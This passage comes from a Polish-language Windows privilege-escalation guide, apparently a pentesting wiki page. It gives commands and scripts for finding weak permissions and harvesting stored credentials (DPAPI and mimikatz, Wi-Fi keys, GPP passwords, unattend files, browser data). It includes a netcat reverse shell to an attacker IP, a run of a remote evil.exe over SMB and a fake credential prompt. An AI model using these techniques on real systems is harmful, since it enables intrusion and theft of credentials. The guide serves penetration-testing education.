Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Uprawnienia do zapisu

Sprawdź, czy możesz modyfikować pewien plik konfiguracyjny, aby odczytać pewien specjalny plik, lub czy możesz modyfikować pewny plik binarny, który zostanie wykonany przez konto Administratora (schedtasks).

Sposób na znalezienie słabych uprawnień folderów/plików w systemie to:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Uruchomienie przy starcie systemu

**Sprawdź, czy możesz nadpisać pewne wpisy rejestru lub pliki binarne, które zostaną wykonane przez innego użytkownika.**\
**Przeczytaj** poniższą stronę, aby dowiedzieć się więcej o interesujących **lokalizacjach automatycznego uruchamiania programów do eskalacji uprawnień**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Sterowniki

Szukaj możliwych **firm trzecich dziwnych/wrażliwych** sterowników
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## Wykorzystanie DLL Hijacking

Jeśli masz **uprawnienia do zapisu wewnątrz folderu obecnego w PATH**, możesz być w stanie przejąć kontrolę nad DLL załadowanym przez proces i **eskalować uprawnienia**.

Sprawdź uprawnienia wszystkich folderów w ścieżce PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Aby uzyskać więcej informacji na temat nadużywania tego sprawdzenia:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Sieć

### Udostępnienia
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### plik hosts

Sprawdź, czy w pliku hosts nie ma wpisów dotyczących innych znanych komputerów.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfejsy sieciowe i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otwarte porty

Sprawdź **ograniczone usługi** z zewnątrz
```bash
netstat -ano #Opened ports?
```
### Tabela routingu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Zasady zapory

[**Sprawdź tę stronę w poszukiwaniu poleceń związanych z zapora**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie zasad, tworzenie zasad, wyłączanie, wyłączanie...)**

Więcej [poleceń do wykonywania inwentaryzacji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem dla systemu Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia roota, możesz nasłuchiwać na dowolnym porcie (po raz pierwszy używając `nc.exe` do nasłuchiwania na porcie, zostanie poproszony interfejsem GUI o zezwolenie na `nc` przez zaporę ogniową).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Poświadczenia systemu Windows

### Poświadczenia Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menedżer poświadczeń / Skarbiec systemu Windows

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Skarbiec systemu Windows przechowuje poświadczenia użytkowników do serwerów, stron internetowych i innych programów, które **system Windows może automatycznie zalogować użytkowników**. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać swoje poświadczenia do Facebooka, Twittera, Gmaila itp., aby automatycznie logować się za pośrednictwem przeglądarek. Ale tak nie jest.

Skarbiec systemu Windows przechowuje poświadczenia, które system Windows może automatycznie zalogować użytkowników, co oznacza, że **dowolna aplikacja systemu Windows, która potrzebuje poświadczeń do dostępu do zasobu** (serwera lub strony internetowej) **może skorzystać z tego Menedżera poświadczeń i Skarbca systemu Windows** oraz użyć dostarczonych poświadczeń zamiast tego, aby użytkownicy wprowadzali nazwę użytkownika i hasło za każdym razem.

Chyba że aplikacje współdziałają z Menedżerem poświadczeń, nie sądzę, żeby mogły one używać poświadczeń dla danego zasobu. Dlatego jeśli twoja aplikacja chce skorzystać ze skarbca, powinna w jakiś sposób **komunikować się z menedżerem poświadczeń i żądać poświadczeń dla tego zasobu** z domyślnego skarbca przechowywania.

Użyj `cmdkey`, aby wyświetlić przechowywane poświadczenia na maszynie.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny za pośrednictwem udziału SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Korzystanie z `runas` z podanym zestawem poświadczeń.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Zauważ, że mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), lub z [modułu Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

**Interfejs programistyczny ochrony danych (DPAPI)** zapewnia metodę szyfrowania symetrycznego danych, głównie używaną w systemie operacyjnym Windows do szyfrowania symetrycznego klucza prywatnego. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, aby istotnie przyczynić się do entropii.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego pochodzącego z sekretów logowania użytkownika**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domeny systemu.

Zaszyfrowane klucze RSA użytkownika, korzystając z DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [Identyfikator Bezpieczeństwa](https://en.wikipedia.org/wiki/Security\_Identifier) użytkownika. **Klucz DPAPI, współlokowany z kluczem głównym zabezpieczającym prywatne klucze użytkownika w tym samym pliku**, zazwyczaj składa się z 64 bajtów losowych danych. (Warto zauważyć, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wylistowanie jego zawartości za pomocą polecenia `dir` w CMD, chociaż można to zrobić za pomocą PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Możesz użyć modułu **mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`) do zdekodowania go.

**Pliki poświadczeń chronione hasłem głównym** zazwyczaj znajdują się w:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Możesz użyć modułu **mimikatz** `dpapi::cred` z odpowiednim `/masterkey` do odszyfrowania.\
Możesz **wydobyć wiele DPAPI** **masterkeys** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli jesteś rootem).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do **skryptowania** i zadań automatyzacji jako sposób przechowywania zaszyfrowanych poświadczeń w wygodny sposób. Poświadczenia są chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że mogą być odszyfrowane tylko przez tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Aby **odszyfrować** poświadczenia PS z pliku zawierającego je, można użyć:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Zapisane połączenia RDP

Możesz je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Ostatnio uruchomione polecenia
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Menedżer poświadczeń pulpitu zdalnego**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Użyj modułu **Mimikatz** `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować pliki .rdg**\
Możesz **wydobyć wiele kluczy głównych DPAPI** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`

### Notatki samoprzylepne

Ludzie często korzystają z aplikacji StickyNotes na stacjach roboczych z systemem Windows, aby **zapisać hasła** i inne informacje, nie zdając sobie sprawy, że jest to plik bazy danych. Ten plik znajduje się pod adresem `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać i przejrzeć.

### AppCmd.exe

**Zauważ, że aby odzyskać hasła z AppCmd.exe, musisz być administratorem i uruchomić go na poziomie Wysokiej Integralności.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, istnieje możliwość, że niektóre **poświadczenia** zostały skonfigurowane i mogą zostać **odzyskane**.

Ten kod został wyodrębniony z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Sprawdź, czy istnieje `C:\Windows\CCM\SCClient.exe`.\
Instalatory są **uruchamiane z uprawnieniami SYSTEMU**, wiele z nich jest podatnych na **DLL Sideloading (Informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Pliki i Rejestr (Dane uwierzytelniające)

### Dane uwierzytelniające Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Klucze hosta SSH Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Klucze SSH w rejestrze

Prywatne klucze SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, dlatego warto sprawdzić, czy znajdują się tam jakieś interesujące informacje:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany zaszyfrowany, ale można go łatwo odszyfrować, korzystając z [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji na temat tej techniki tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Jeśli usługa `ssh-agent` nie jest uruchomiona i chcesz, aby uruchamiała się automatycznie podczas uruchamiania systemu, wykonaj:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Wygląda na to, że ta technika nie jest już ważna. Spróbowałem utworzyć kilka kluczy ssh, dodać je za pomocą `ssh-add` i zalogować się za pomocą ssh do maszyny. Gałąź HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie zidentyfikował użycia `dpapi.dll` podczas uwierzytelniania klucza asymetrycznego.
{% endhint %}

### Pliki bezobsługowe
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Możesz również wyszukać te pliki za pomocą **metasploita**: _post/windows/gather/enum\_unattend_

Przykładowa zawartość:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Kopie zapasowe SAM i SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Poświadczenia chmurowe
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Cached GPP Pasword

Funkcja była wcześniej dostępna, umożliwiając wdrożenie niestandardowych kont administratora lokalnego na grupie maszyn za pomocą Preferencji zasad grupy (GPP). Jednakże ta metoda miała poważne luki bezpieczeństwa. Po pierwsze, Obiekty zasad grupy (GPO), przechowywane jako pliki XML w SYSVOL, mogły być dostępne dla dowolnego użytkownika domeny. Po drugie, hasła w tych GPP, zaszyfrowane za pomocą AES256 przy użyciu publicznie udokumentowanego domyślnego klucza, mogły być odszyfrowane przez dowolnego uwierzytelnionego użytkownika. Stanowiło to poważne ryzyko, ponieważ mogło pozwolić użytkownikom uzyskać podwyższone uprawnienia.

Aby zmniejszyć to ryzyko, opracowano funkcję skanowania plików GPP przechowywanych lokalnie, zawierających pole "cpassword", które nie jest puste. Po znalezieniu takiego pliku, funkcja deszyfruje hasło i zwraca niestandardowy obiekt PowerShell. Ten obiekt zawiera szczegóły dotyczące GPP i lokalizację pliku, co pomaga zidentyfikować i naprawić tę lukę w zabezpieczeniach.

Wyszukaj w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (poprzednie niż W Vista)_ te pliki:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Aby odszyfrować cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Używanie crackmapexec do uzyskania haseł:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Konfiguracja sieciowa IIS
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Przykład pliku web.config z danymi uwierzytelniającymi:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Dane uwierzytelniające OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Dzienniki
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Poproś o poświadczenia

Zawsze możesz **poprosić użytkownika o podanie swoich poświadczeń lub nawet poświadczeń innego użytkownika**, jeśli uważasz, że może je znać (zauważ, że **prośba** bezpośrednio klienta o **poświadczenia** jest naprawdę **ryzykowna**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Możliwe nazwy plików zawierające dane uwierzytelniające**

Znane pliki, które pewnego czasu temu zawierały **hasła** w formie **czystego tekstu** lub **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Przeszukaj wszystkie proponowane pliki:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Poświadczenia w Koszu

Należy również sprawdzić Kosz, aby znaleźć w nim poświadczenia

Aby **odzyskać hasła** zapisane przez kilka programów, można użyć: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru z poświadczeniami**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Wyodrębnij klucze openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Należy sprawdzić bazy danych, w których przechowywane są hasła z **Chrome'a lub Firefoksa**.\
Sprawdź również historię, zakładki i ulubione przeglądarek, ponieważ tam mogą być przechowywane **hasła**.

Narzędzia do wyodrębniania haseł z przeglądarek:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Nadpisywanie DLL COM**

**Model Obiektów Składowych (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między składnikami oprogramowania różnych języków. Każdy składnik COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a każdy składnik udostępnia funkcjonalność za pomocą jednego lub więcej interfejsów, identyfikowanych za pomocą identyfikatorów interfejsów (IIDs).

Klasy i interfejsy COM są zdefiniowane w rejestrze pod **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** oraz **HKEY\_**_**CLASSES\_**_**ROOT\Interface**. Ten rejestr jest tworzony poprzez połączenie kluczy **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Wewnątrz CLSID tego rejestru można znaleźć podrzędny rejestr **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może być **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) lub **Neutral** (wątek neutralny).

![](<../../.gitbook/assets/image (729).png>)

W zasadzie, jeśli można **nadpisać którykolwiek z plików DLL**, które zostaną wykonane, można **eskalować uprawnienia**, jeśli to DLL zostanie wykonane przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują przejęcie COM jako mechanizm trwałości, sprawdź:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Wyszukiwanie ogólnych haseł w plikach i rejestrze**

**Wyszukiwanie treści plików**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Wyszukaj plik o określonej nazwie**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Wyszukaj rejestr w poszukiwaniu nazw kluczy i haseł**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Narzędzia wyszukujące hasła

[**Wtyczka MSF-Credentials**](https://github.com/carlospolop/MSF-Credentials) **jest wtyczką do msf**, którą stworzyłem, aby **automatycznie wykonywała każdy moduł POST metasploita, który wyszukuje poświadczenia** w systemie ofiary.\
